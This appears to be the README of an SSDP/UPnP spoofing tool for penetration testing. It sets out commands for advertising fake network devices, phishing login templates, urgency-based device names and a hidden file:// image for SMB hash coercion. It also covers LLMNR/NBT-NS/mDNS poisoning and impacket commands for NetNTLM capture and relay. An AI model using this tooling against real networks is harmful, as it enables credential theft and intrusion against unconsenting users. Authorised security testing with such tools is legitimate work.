# Flask Evil SSDP

A sophisticated multi-template UPnP (Universal Plug and Play) spoofing framework designed for network penetration testing and security research. This tool leverages SSDP (Simple Service Discovery Protocol) to impersonate legitimate network devices and capture credentials through convincing phishing pages.

**Credits**: This project is inspired by and based on the excellent work from [evil-ssdp](https://github.com/initstring/evil-ssdp/tree/master).

---

## Features

- **Multi-Template Support**: Run multiple fake device templates simultaneously on a single server
- **SSDP Spoofing**: Responds to UPnP discovery requests and masquerades as legitimate devices
- **Credential Harvesting**: Captures credentials through phishing forms
- **Customizable Devices**: Create templates for any UPnP device type (printers, scanners, routers, etc.)
- **Flexible Redirects**: Route victims to custom URLs after credential submission
- **Analyze Mode**: Passive monitoring without active SSDP responses

---

## Installation

### Requirements

```bash
python3 >= 3.7
flask
ifaddr
```

### Setup

```bash
git clone https://github.com/gbuyssens/flask-evil-ssdp.git
cd flask-evil-ssdp
pip install -r requirements.txt

# Optional: NetNTLM capture/relay (--smb-capture, --relay) and poisoner capture
pip install -r requirements-capture.txt
```

---

## Usage

### Basic Example

```bash
sudo python3 app.py eth0 -t scanner -p 8888
```

### Parameters

| Argument | Description | Example |
|----------|-------------|---------|
| `interface` | Network interface to bind to | `eth0`, `wlan0` |
| `-p, --port` | HTTP server port | `-p 8888` |
| `-t, --templates` | Template names (space-separated) or `all` | `-t scanner printer` |
| `-s, --smb` | SMB server IP for embedded resources | `-s 192.168.1.100` |
| `-u, --urls` | Custom redirect URLs for each template | `-u http://attacker.com/redirect` |
| `-a, --analyze` | Analyze mode (no SSDP responses) | `-a` |
| `-L, --list` | List available templates | `-L` |

### Advanced Examples

```bash
# Run all templates on interface eth0
sudo python3 app.py eth0 -t all -p 8888

# Run specific templates with custom redirects
sudo python3 app.py eth0 -t scanner printer -u "http://attacker.com/1" "http://attacker.com/2"

# Analyze mode - only listen, don't respond
sudo python3 app.py eth0 -t scanner -a

# Specify SMB server for embedded resources
sudo python3 app.py eth0 -t scanner -s 192.168.1.50

# List available templates
python3 app.py -L
```

---

## Understanding device.xml

The `device.xml` file is the UPnP device description document. It defines how your fake device will be advertised on the network.

### Key Elements

```xml
<presentationURL>http://{{ local_ip }}:{{ local_port }}/ssdp/{{ template_idx }}/present.html</presentationURL>
```
URL of the phishing login page served to victims. The `{{ template_idx }}` allows multiple templates to have different presentation URLs.

```xml
<deviceType>urn:schemas-upnp-org:device:Scanner:1</deviceType>
<friendlyName>Corporate Scanner [3 NEW SCANS WAITING]</friendlyName>
```
Device type and display name. The friendly name should be contextual and create urgency to increase social engineering effectiveness.

```xml
<manufacturer>Xerox</manufacturer>
<modelName>ScanMaster5000</modelName>
```
Device metadata that increases legitimacy. Customize these to match real devices in the target environment.

```xml
<UDN>{{ session_usn }}</UDN>
```
Unique Device Name - replaced with a generated UUID at runtime.

### Customization Tips

1. Change the `deviceType` to match your target environment
2. Use realistic `friendlyName` values that employees would recognize
3. Adjust `manufacturer` and `modelName` to match common devices in your test environment

---

## Understanding present.html

The `present.html` file is the phishing login page served to victims.

### Credential Capture Form

```html
<form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
  <input type="username" name="username" placeholder="Username" />
  <input type="password" name="password" placeholder="Password" />
  <input type="submit" value="Log in" />
</form>
```

When submitted:
- User credentials are POSTed to `/ssdp/{{ template_idx }}/hook.html`
- The server captures and logs the credentials with timestamp and source IP
- User is redirected (to create the illusion of successful login)

---

## Template Structure

Each template should have the following directory structure:

```
templates/
├── office365/
│   ├── device.xml
│   ├── present.html
│   ├── logo.png
│   ├── script.js
│   └── style.css
├── scanner/
│   ├── device.xml
│   ├── present.html
│   └── style.css
```

---

## Logging

All captured events are logged to `logs-essdp.txt` with timestamps:

```
2024-01-15 14:23:45:    [*] Credentials captured [Template 0: scanner] - Host: 192.168.1.50
2024-01-15 14:23:45:      username: john.doe
2024-01-15 14:23:45:      password: SecurePass123!
```

---

## Common UPnP Device Types

The `deviceType` you declare in `device.xml` decides which category the fake device
lands in on the victim's machine — in Windows Explorer's **Network** view, an
`InternetGatewayDevice:1` shows up under *Network Infrastructure* while a
`MediaServer:1` shows up under *Media Devices*. Pick the one that matches the story your
`friendlyName` tells.

> **Important:** only some of these categories actually come from UPnP/SSDP. Windows
> discovers **printers and scanners via WS-Discovery (WSD), not SSDP** — so a
> `Printer:1`/`Scanner:1` advertised over SSDP will **not** reliably appear under
> *Printers*. Use `--wsd` for printer/scanner visibility on Windows 10/11 (see
> *Extended discovery & credential capture* below). 

### Standard UPnP Forum types

| Device | URN | Windows Explorer category |
|--------|-----|---------------------------|
| Basic / generic | `urn:schemas-upnp-org:device:Basic:1` | Other Devices |
| Router / gateway | `urn:schemas-upnp-org:device:InternetGatewayDevice:1` (also `:2`) | Network Infrastructure |
| WAN Device | `urn:schemas-upnp-org:device:WANDevice:1` | (sub-device of IGD) |
| WAN Connection | `urn:schemas-upnp-org:device:WANConnectionDevice:1` | (sub-device of IGD) |
| LAN Device | `urn:schemas-upnp-org:device:LANDevice:1` | (sub-device of IGD) |
| Wireless access point | `urn:schemas-upnp-org:device:WLANAccessPointDevice:1` | Network Infrastructure |
| Media Server | `urn:schemas-upnp-org:device:MediaServer:1` (also `:2` `:3` `:4`) | Media Devices |
| Media Renderer | `urn:schemas-upnp-org:device:MediaRenderer:1` (also `:2` `:3`) | Media Devices |
| Printer | `urn:schemas-upnp-org:device:Printer:1` | Printers¹ |
| Scanner | `urn:schemas-upnp-org:device:Scanner:1` | Printers¹ |
| Camera | `urn:schemas-upnp-org:device:DigitalSecurityCamera:1` | Other Devices |
| Light | `urn:schemas-upnp-org:device:BinaryLight:1` | Other Devices |
| Dimmable light | `urn:schemas-upnp-org:device:DimmableLight:1` | Other Devices |

> ¹ Windows discovers printers/scanners over **WS-Discovery (WSD)**, not SSDP — a
> `Printer:1`/`Scanner:1` advertised via SSDP will not reliably land under *Printers*.
> Run with `--wsd` for printer/scanner visibility on modern Windows.

`Basic:1` is the fallback when nothing fits. Appliances with no dedicated UPnP
profile — a BMC, an identity provider, a firewall — should use it.

### De facto types outside the UPnP Forum namespace

| Device | URN |
|--------|-----|
| DIAL — Chromecast, Android TV, meeting-room displays | `urn:dial-multiscreen-org:device:dial:1` |
| Wi-Fi Protected Setup | `urn:schemas-wifialliance-org:device:WFADevice:1` |
| Sonos and other smart speakers | `urn:smartspeaker-audio:device:SpeakerDevice:1` |
| Roku | `roku:ecp` |

### Search targets

These are **not** device types — never put them in `device.xml`. They are the `ST`
values a client sends in an M-SEARCH, and which the server echoes back in its
response.

| Target | Meaning |
|--------|---------|
| `upnp:rootdevice` | Root devices only — by far the most common `ST` |
| `ssdp:all` | Everything that answers |
| `uuid:<UDN>` | One specific device |

> **Tip:** rather than guessing, run analyze mode first (`-a`). The server logs every
> `ST` it sees (`New host detected: … (ST: …)`), so you can see what the target
> network actually searches for before deciding what to advertise.
---

## Extended discovery & credential capture

Beyond the classic SSDP M-SEARCH responder, the server can reach more hosts and
harvest credentials through additional protocols. These are **opt-in** flags.

### Reach more hosts (still SSDP)

- **Proactive `NOTIFY ssdp:alive`** — on by default (disable with `--no-notify`).
  The original tool is purely *reactive*: it only appears to a host after that host
  sends an M-SEARCH. NOTIFY multicasts the fake devices into every SSDP listener's
  cache without waiting to be searched, re-announces every `--notify-interval` seconds
  (default 900), and sends `ssdp:byebye` on shutdown.
- **WS-Discovery** (`--wsd`) — the SOAP-over-UDP protocol (UDP 3702) that Windows
  10/11 *Network* Explorer actually uses (SSDP is still live, but WSD covers printers,
  scanners and cross-subnet discovery that SSDP does not). Sends a WSD `Hello` on
  start, answers `Probe`/`Resolve`, and serves device metadata from the existing HTTP
  server (`/wsd/<idx>/metadata.xml`), reusing the same templates and phishing pages.
  > WSD device *Types*/metadata are modeled on `christgau/wsdd`; confirm visibility
  > against a real Windows 10/11 target — it depends on the victim's services and
  > network profile.

### More access — name poisoning → NetNTLM (Responder class)

Instead of waiting for a human to type a password, answer the victim's **failed name
lookups** with "that host is me" and let Windows authenticate to you automatically:

- `--llmnr` (UDP 5355, `224.0.0.252`), `--nbtns` (UDP 137 broadcast),
  `--mdns` (UDP 5353, `224.0.0.251`), or `--poison` for all three.
- `--respond-to NAME ...` restricts poisoning to specific names.

**The catch:** poisoning only *redirects* the victim to you. The NetNTLM hash lives in
the SMB/HTTP auth handshake that follows, which Flask cannot speak. Capture it with
[impacket](https://github.com/fortra/impacket):

```bash
# Capture NetNTLMv2 (crack offline: hashcat -m 5600)
sudo impacket-smbserver -smb2support -ip <local_ip> share ./loot     # or: --smb-capture

# Relay live (code-exec / LDAP escalation, no cracking)
sudo impacket-ntlmrelayx -t <target> -smb2support                    # or: --relay <target>
```

`--smb-capture` / `--relay` launch impacket for you if it is on `PATH`.

### Honest caveats

- The templates' hidden `<img src="file://///{{ smb_server }}/smb/hash.jpg">` restores
  the upstream SMB-coercion trick, **but modern Chromium/Edge/Firefox block `file://`
  and UNC subresources loaded from an HTTP page** — so it is unreliable from a browser.
  The dependable NetNTLM leak is the **OS-level poisoners above**, not the `<img>`.
- **SMB relay fails against SMB-signing hosts** — the default on Windows 11 24H2,
  Server 2025, and all Domain Controllers.
- LLMNR/NBT-NS are being phased out (LLMNR off by default on Win11 24H2; disabled by
  CIS/STIG hardening), so yield is lower on modern/hardened networks.
- **Port conflicts:** the poisoners bind UDP 5353 (mDNS) and 5355 (LLMNR), which on
  Kali are held by `avahi-daemon` and `systemd-resolved`. The tool skips a protocol
  whose port is busy (with a warning) instead of crashing — free the ports first with
  `sudo systemctl stop avahi-daemon systemd-resolved`.

---

## Development

Offline unit tests cover the packet builders and parsers (SSDP NOTIFY, WSD SOAP,
LLMNR/NBT-NS/mDNS responses). They need no root, sockets or third-party deps:

```bash
python3 tests/test_app.py
```

CI (`.github/workflows/ci.yml`) runs `py_compile` + the tests on Python 3.9/3.11/3.12
and a smoke test (`python app.py -L`) on 3.12.

---

## References

- [Valerchk - O365 Phishing Page](https://github.com/Valerchk/Microsoft-Page-tester)
